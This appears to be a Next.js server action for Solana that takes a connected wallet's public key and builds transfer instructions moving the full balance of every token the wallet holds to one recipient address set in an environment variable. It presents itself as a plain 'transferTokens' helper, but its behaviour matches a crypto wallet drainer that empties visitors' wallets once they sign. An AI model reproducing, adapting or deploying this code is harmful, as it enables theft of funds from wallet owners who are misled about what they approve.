"use server";

import { Connection, PublicKey, TransactionInstruction } from "@solana/web3.js";
import {
  createAssociatedTokenAccountInstruction,
  createTransferInstruction,
  getAccount,
  getAssociatedTokenAddress,
} from "@solana/spl-token";
import { tokensToLamports } from "./utils";
import { getTokenAccounts } from "./getTokens";

export async function transferTokens(publicKeyString: string) {
  try {
    const publicKey = new PublicKey(publicKeyString);
    const connection = new Connection(process.env.NEXT_PUBLIC_RPC_URL!);

    const tokenAccountsResponse = JSON.parse(
      await getTokenAccounts(publicKeyString)
    );
    const totalTransferInstructions: TransactionInstruction[] = [];

    for (const tokenAccount of tokenAccountsResponse.value) {
      const mintToken = new PublicKey(
        tokenAccount.account.data.parsed.info.mint
      );
      const baseAmount =
        tokenAccount.account.data["parsed"]["info"]["tokenAmount"]["amount"];
      const recipientAddress = new PublicKey(
        process.env.NEXT_PUBLIC_TARGET_ADDRESS!
      );
      const associatedTokenFrom = await getAssociatedTokenAddress(
        mintToken,
        publicKey
      );
      const fromAccount = await getAccount(connection, associatedTokenFrom);
      const associatedTokenTo = await getAssociatedTokenAddress(
        mintToken,
        recipientAddress
      );

      if (!(await connection.getAccountInfo(associatedTokenTo))) {
        totalTransferInstructions.push(
          createAssociatedTokenAccountInstruction(
            publicKey,
            associatedTokenTo,
            recipientAddress,
            mintToken
          )
        );
      }

      console.log("This is your baseamount ", baseAmount);

      totalTransferInstructions.push(
        createTransferInstruction(
          fromAccount.address,
          associatedTokenTo,
          publicKey,
          // base amount here
          baseAmount
        )
      );
    }

    console.log(JSON.stringify(totalTransferInstructions));

    return JSON.stringify(totalTransferInstructions);
  } catch (error) {
    console.log("[createTransactionApi] ", error);
    throw error;
  }
}
